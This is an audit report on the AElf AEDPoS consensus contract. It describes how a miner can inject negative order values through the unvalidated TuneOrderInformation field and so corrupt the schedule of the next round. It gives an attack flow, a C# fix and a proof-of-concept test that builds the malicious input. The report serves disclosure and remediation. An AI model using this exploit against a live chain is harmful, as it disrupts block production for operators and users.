# Audit Report

## Title
Unvalidated TuneOrderInformation Allows Injection of Negative Order Values Leading to Consensus Disruption

## Summary
A malicious miner can inject negative `FinalOrderOfNextRound` values through the unvalidated `TuneOrderInformation` field in `UpdateValueInput`, causing miners to be assigned negative `Order` values and past `ExpectedMiningTime` timestamps in the next round, breaking critical consensus invariants.

## Finding Description

The AEDPoS consensus mechanism allows miners to propose order adjustments for the next round through the `TuneOrderInformation` field when calling `UpdateValue`. However, this field lacks validation, allowing negative values to be injected.

**Attack Flow:**

1. A malicious miner crafts an `UpdateValueInput` with `TuneOrderInformation` containing negative values (e.g., `{targetMinerPubkey: -100}`)

2. The miner calls the public `UpdateValue` method [1](#0-0) 

3. The `UpdateValueValidationProvider` validates only `OutValue`, `Signature`, and `PreviousInValue`, completely ignoring `TuneOrderInformation` [2](#0-1) 

4. `ProcessUpdateValue` directly applies the malicious values without bounds checking [3](#0-2) 

5. When generating the next round, miners are ordered by their `FinalOrderOfNextRound` values, with negative values sorting first [4](#0-3) 

6. The negative order is directly assigned as the miner's `Order`, and `ExpectedMiningTime` is calculated as `currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order))`, creating a timestamp in the past [5](#0-4) 

7. The `NextRoundMiningOrderValidationProvider` fails to catch this because it validates the newly generated round where all `FinalOrderOfNextRound` values default to 0, making both counts equal to 0 and passing validation [6](#0-5) 

## Impact Explanation

**Consensus Invariant Violations:**
- Breaks the invariant that miner `Order` values must be in range [1, minersCount]
- Creates miners with past `ExpectedMiningTime` timestamps, corrupting the deterministic mining schedule
- Disrupts the time slot allocation mechanism that consensus relies upon

**Operational Impact:**
- Miners with negative orders and past time slots cause timing conflicts
- Time slot validation logic may behave unpredictably with historical timestamps
- Block production schedule becomes non-deterministic
- The corrupted round state persists and affects subsequent round transitions

This is a Medium severity issue because while it doesn't enable direct fund theft, it breaks critical consensus protocol invariants and can cause operational disruption to the blockchain's block production mechanism.

## Likelihood Explanation

**Attack Feasibility:**
The attack is highly feasible with low complexity:
- Requires only being an active miner in the current round (achievable through normal election)
- The `UpdateValue` method is publicly accessible to all miners
- No cryptographic sophistication needed - just construct malicious input data
- Can be executed in a single block during the attacker's time slot

**Economic Considerations:**
While a miner attacking their own network seems irrational, scenarios include:
- Strategic disruption during contentious governance decisions
- Competitive advantage by disrupting rival miners' time slots
- External incentives to harm the network (e.g., shorting positions)

## Recommendation

Add validation in `ProcessUpdateValue` to ensure `TuneOrderInformation` values are within valid bounds:

```csharp
// In ProcessUpdateValue method, before applying TuneOrderInformation
var minersCount = currentRound.RealTimeMinersInformation.Count;
foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
{
    // Validate the tuned order is within valid range [1, minersCount]
    if (tuneOrder.Value < 1 || tuneOrder.Value > minersCount)
    {
        Assert(false, $"Invalid tuned order value: {tuneOrder.Value}. Must be between 1 and {minersCount}");
    }
    
    // Validate the target miner exists in current round
    if (!currentRound.RealTimeMinersInformation.ContainsKey(tuneOrder.Key))
    {
        Assert(false, $"Invalid miner pubkey in TuneOrderInformation: {tuneOrder.Key}");
    }
    
    currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound = tuneOrder.Value;
}
```

Additionally, add validation in `UpdateValueValidationProvider` to check `TuneOrderInformation` before execution.

## Proof of Concept

```csharp
[Fact]
public async Task UpdateValue_NegativeOrderInjection_Test()
{
    // Setup: Initialize consensus with multiple miners
    await InitializeConsensusAsync();
    
    // Attacker is a miner in current round
    var attackerKeyPair = InitialCoreDataCenterKeyPairs[0];
    KeyPairProvider.SetKeyPair(attackerKeyPair);
    
    var currentRound = await GetCurrentRoundInformationAsync();
    var victimPubkey = InitialCoreDataCenterKeyPairs[1].PublicKey.ToHex();
    
    // Create malicious UpdateValueInput with negative TuneOrderInformation
    var maliciousInput = new UpdateValueInput
    {
        OutValue = HashHelper.ComputeFrom("test"),
        Signature = HashHelper.ComputeFrom("signature"),
        ActualMiningTime = TimestampHelper.GetUtcNow(),
        SupposedOrderOfNextRound = 1,
        TuneOrderInformation = { { victimPubkey, -100 } }, // Negative order injection
        RandomNumber = ByteString.CopyFrom(await GenerateRandomProofAsync(attackerKeyPair))
    };
    
    // Execute attack
    await AEDPoSContractStub.UpdateValue.SendAsync(maliciousInput);
    
    // Verify negative order was applied
    var updatedRound = await GetCurrentRoundInformationAsync();
    updatedRound.RealTimeMinersInformation[victimPubkey].FinalOrderOfNextRound.ShouldBe(-100);
    
    // Trigger NextRound to generate corrupted round
    await ProduceBlocksUntilRoundEnd();
    var nextRound = await GetCurrentRoundInformationAsync();
    
    // Verify vulnerability: victim has negative Order and past ExpectedMiningTime
    var victimMiner = nextRound.RealTimeMinersInformation[victimPubkey];
    victimMiner.Order.ShouldBe(-100); // Negative order assigned
    victimMiner.ExpectedMiningTime.ShouldBeLessThan(TimestampHelper.GetUtcNow()); // Past timestamp
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract.cs (L98-102)
```csharp
    public override Empty UpdateValue(UpdateValueInput input)
    {
        ProcessConsensusInformation(input);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L10-20)
```csharp
    public ValidationResult ValidateHeaderInformation(ConsensusValidationContext validationContext)
    {
        // Only one Out Value should be filled.
        if (!NewConsensusInformationFilled(validationContext))
            return new ValidationResult { Message = "Incorrect new Out Value." };

        if (!ValidatePreviousInValue(validationContext))
            return new ValidationResult { Message = "Incorrect previous in value." };

        return new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L259-260)
```csharp
        foreach (var tuneOrder in updateValueInput.TuneOrderInformation)
            currentRound.RealTimeMinersInformation[tuneOrder.Key].FinalOrderOfNextRound = tuneOrder.Value;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L26-26)
```csharp
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L28-36)
```csharp
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
                ExpectedMiningTime = currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order)),
                ProducedBlocks = minerInRound.ProducedBlocks,
                MissedTimeSlots = minerInRound.MissedTimeSlots
            };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/NextRoundMiningOrderValidationProvider.cs (L15-21)
```csharp
        var distinctCount = providedRound.RealTimeMinersInformation.Values.Where(m => m.FinalOrderOfNextRound > 0)
            .Distinct().Count();
        if (distinctCount != providedRound.RealTimeMinersInformation.Values.Count(m => m.OutValue != null))
        {
            validationResult.Message = "Invalid FinalOrderOfNextRound.";
            return validationResult;
        }
```
